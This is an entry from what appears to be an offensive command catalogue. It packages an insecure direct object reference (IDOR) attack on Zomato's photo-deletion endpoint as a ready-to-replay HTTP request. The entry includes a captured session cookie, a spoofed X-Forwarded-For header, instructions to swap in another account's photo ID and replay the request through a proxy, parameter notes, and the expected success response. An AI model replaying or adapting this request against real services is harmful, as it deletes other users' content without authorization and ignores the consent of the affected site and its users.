---
id: cmd-404797-modified-deletion
data: >-
  GET
  /php/client_manage_handler?███&photo_ids%5B%5D=r_YxNDUOTE4MTYzO&removable=1&case=remove-active-photo
  HTTP/1.1

  Host: www.zomato.com

  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101
  Firefox/61.0

  Accept: */*

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Referer: https://www.zomato.com/

  X-Requested-With: XMLHttpRequest

  Cookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423;
  PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en;
  fbtrack=a09417c27b7e98b4b3f2ad8357ef3903;
  __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN;
  __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2;
  cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1;
  squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1;
  session_id=null

  Connection: close

  X-Forwarded-For: 127.0.0.1
tags:
  - idor
  - deletion
type: command
output: '{"status":"success"}'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.445Z'
verified: false
validated: true
submitted: true
---
# Zomato Modified Photo Deletion for IDOR

## Command

```http
GET /php/client_manage_handler?███&photo_ids%5B%5D=r_YxNDUOTE4MTYzO&removable=1&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
X-Requested-With: XMLHttpRequest
Cookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null
Connection: close
X-Forwarded-For: 127.0.0.1
```

## Description

This modified HTTP GET request exploits IDOR by using a foreign photo_id with a different res_id, deleting unauthorized photos. Replay via proxy after capturing a baseline from another account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| res_id | Authenticated restaurant ID (keep original) | Yes |
| photo_ids[] | Foreign photo ID (replaced for IDOR) | Yes |
| removable | Set to 1 for deletion eligibility | Yes |
| case | remove-active-photo for action | Yes |

## Examples

### Basic Usage

```http
GET /php/client_manage_handler?res_id=67890&photo_ids%5B%5D=r_FOREIGNID&removable=1&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
...
```

### Advanced Usage

With full cookie session:

```http
GET /php/client_manage_handler?res_id=67890&photo_ids%5B%5D=r_FOREIGNID&removable=1&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
Cookie: PHPSESSID=example...
...
```

## Expected Output

{"status":"success"} even for foreign IDs, confirming deletion.

## Related

- [[commands/zomato-photo-deletion-request]]
